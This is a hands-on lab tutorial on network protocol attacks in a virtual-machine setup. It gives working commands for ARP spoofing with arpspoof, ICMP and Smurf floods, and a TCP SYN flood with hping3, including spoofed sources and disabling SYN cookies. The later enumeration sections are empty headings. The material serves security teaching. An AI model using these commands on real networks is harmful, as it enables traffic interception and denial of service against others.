---
title: "Lab 1. Network protocol attacks"
excerpt: "In this lab, you’ll learn how to do different network protocol attacks."
layout: single
classes: toc-right
author_profile: false
toc: true
toc_sticky: true
sidebar:
  nav: "labs"
collection: labs
categories: 
  - custom-labs
tags: 
  - tutorial
  - arp
  - spoofing
  - nmap
---
## Enviroment

This lab builds upon the environment setup from [Lab 0. Environment setup](/labs/a00-setting-up-enviroment/). All attacks will be launched from **VM_2**.

> **Warning:** While Wireshark is extremely useful for analyzing network traffic, it’s not recommended to run it during *flood* attacks due to the high volume of packets it will attempt to capture. This can cause performance issues or even crash the interface.

> **Tip:** If you're running Wireshark in VirtualBox and not seeing any traffic, make sure promiscuous mode is enabled:
>
> `Devices → Network → Network Settings → Adapter → Advanced → Promiscuous Mode: Allow All`

## Link layer

### ARP Spoofing

#### What is ARP Spoofing?

The Address Resolution Protocol (ARP) maps IP addresses to MAC (hardware) addresses in local networks. ARP spoofing exploits the lack of authentication in this process: an attacker can send forged ARP responses to mislead devices about the MAC address of other machines on the network. This allows the attacker to intercept, modify, or block traffic—effectively performing a **Man-in-the-Middle (MitM)** attack.

#### Objective

We’ll trick two machines on the network (typically a victim and its default gateway) into thinking that **VM_2** is the other party. This allows us to intercept all traffic between them.

#### Step 1: Enable IP Forwarding on VM_2

To avoid breaking communication between the victim and the gateway (which would turn this into a DoS attack), we need to enable IP forwarding so VM_2 can relay packets:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

This makes VM_2 behave like a router, forwarding packets between interfaces.

#### Step 2: Launch ARP Spoofing Attack with `arpspoof`

We’ll use the `arpspoof` tool from the `dsniff` package to carry out the attack. You may need to install it first:

```bash
sudo apt install dsniff
```

Now launch the attack from **VM_2** with:

```bash
sudo arpspoof -t 192.168.0.1 -r 192.168.0.3
```

* `-t 192.168.0.1`: This tells `arpspoof` to target the system at IP `192.168.0.1` (e.g., the router).

* `-r 192.168.0.3`: This option tells it to **also** poison the other system (e.g., the victim machine).

Using both `-t` and `-r` enables **bidirectional poisoning**, allowing you to intercept traffic flowing **both ways**.

> By default, if you omit `-t`, `arpspoof` will poison *all* machines on the network, which could be useful (or risky) in larger scenarios.

#### Step 3: Observe ARP Table Changes

On both **VM_1** and **VM_3**, run the following to inspect the ARP table:

```bash
ip neigh
```

You should notice that the MAC address for the other party (router or victim) has been replaced by VM_2’s MAC address—proof that the ARP poisoning is working.

#### Step 4: Monitor Intercepted Traffic with Wireshark

With ARP spoofing in place, run Wireshark on VM_2 and start capturing packets on the correct network interface (`enp0s3`).

Apply the following display filter to focus on traffic between the victim and the router:

```ini
ip.addr == 192.168.0.1 && ip.addr == 192.168.0.3
```

You should now see packets flowing *through* VM_2, even though VM_2 is not the intended destination.

<details>
  <summary>Example screenshot (click to expand)</summary>
    <img src="/assets/images/a01-arpspoof.png" />
</details>


## Network Layer

### ICMP/ping flood

#### What is an ICMP flood?

An ICMP flood—commonly known as a ping flood—is a type of **Denial of Service (DoS)** attack. It overwhelms the target system by sending a large number of ICMP Echo Request (ping) packets, consuming its bandwidth and processing power.

#### Objective

We’ll use `hping3` to send a flood of ICMP packets from **VM_2** to the victim (typically **VM_1** or the router), simulating a DoS attack.

#### Step 1: Start the Attack from VM_2

```bash
sudo hping3 --icmp --flood 192.168.0.1
```

> This command sends an endless stream of ICMP Echo Request packets to the router at maximum rate.

#### Step 2: Use Variants of the Attack

1. **Randomize the source IP address** (to simulate a distributed attack):

   ```bash
   sudo hping3 --icmp --flood --rand-source 192.168.0.1
   ```

2. **Send larger ICMP packets** (to consume more bandwidth):

   ```bash
   sudo hping3 --icmp --flood -d 1400 192.168.0.1
   ```

> You can monitor the traffic on the target using
>
> ```bash
> ip -s link
> ```
>
> **Note:** For the attack to be effective, the attacker must have **more bandwidth** than the victim.

<details>
  <summary>Example screenshot (click to expand)</summary>
    <img src="/assets/images/a01-icmp-flood.png" />
</details>




### Smurf Attack

#### What is a Smurf Attack?

A Smurf attack is a **reflective DoS** attack that exploits devices configured to respond to ICMP requests sent to a broadcast address. The attacker sends spoofed ping requests to the broadcast address of a network, making all devices respond to the victim.

#### Step 1: Allow ICMP Broadcast Echo

By default, Linux ignores pings to broadcast addresses. Enable replies on **VM_1**, **VM_2**, and **VM_3**:

```bash
sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=0
```

#### Step 2: Launch the Smurf Attack from VM_2

```bash
sudo hping3 --icmp --flood --spoof 192.168.0.1 192.168.0.255
```

* `--spoof 192.168.0.1`: Fakes the source IP as the victim (router).

* `192.168.0.255`: Broadcast address of the subnet.

> Multiple devices (reflectors) will respond to the spoofed ping, overwhelming the victim.

<details>
  <summary>Example screenshot (click to expand)</summary>
    <img src="/assets/images/a01-smurf-attack.png" />
</details>


## Transport Layer

### TCP SYN Flood

#### What is a TCP SYN Flood?

A TCP SYN flood is a classic **DoS attack** that exploits the TCP 3-way handshake. The attacker sends a large number of SYN requests to the victim, but never completes the handshake. This causes the server to allocate resources for incomplete connections, eventually exhausting its backlog queue.

#### Step 1: Start a Web Server on VM_1

We'll use Python to simulate a server that listens on port 8000:

```bash
python3 -m http.server 8000
```

#### Step 2: Block SYN+ACK Responses on VM_2

To prevent the attacker's OS from responding to SYN+ACKs (and breaking the attack), we drop these packets:

```bash
sudo systemctl start nftables
sudo nft add rule inet filter input tcp flags == 'syn|ack' drop
```

> This ensures the victim keeps the half-open connections without receiving RSTs.

#### Step 3: Launch the SYN Flood from VM_2

```bash
sudo hping3 --syn --flood -p 8000 192.168.0.1
```

* `--syn`: Sends TCP SYN packets.
* `--flood`: Sends as many packets as possible.
* `-p 8000`: Targets the web server port.

#### Step 4: Monitor the Victim (VM_1)

Check the status of TCP connections:

```bash
ss -tan
```

You should see many connections stuck in the `SYN_RECV` state.

#### Step 5: Try Connecting from VM_3

Attempt to access the server from another machine:

```bash
wget 192.168.0.1:8000
```

> If the attack is effective, this connection may hang or fail due to resource exhaustion.

#### Step 6: Disable SYN Cookies on VM_1 (Optional)

SYN cookies mitigate SYN floods by not allocating memory until the handshake is complete. Disable them for testing:

```bash
sudo sysctl -w net.ipv4.tcp_syncookies=0
```

> This makes the victim more vulnerable to SYN floods but helps observe the attack's impact.

#### Step 7: Try Connecting Again from VM_3

Repeat the `wget` command and observe if the server becomes less responsive.

#### Step 8: Clean Up

Remove the firewall rule on **VM_2**:

```bash
sudo nft flush ruleset
```

<details>
  <summary>Example screenshot (click to expand)</summary>
    <img src="/assets/images/a01-tcp-syn-flood-attack.png" />
    <p>
        After disabling SYN Cookies you should see that you can't connect the server.
    </p>
</details>


## Network enum

### System discovery

### Port scanning

### Service detection

## SO detection
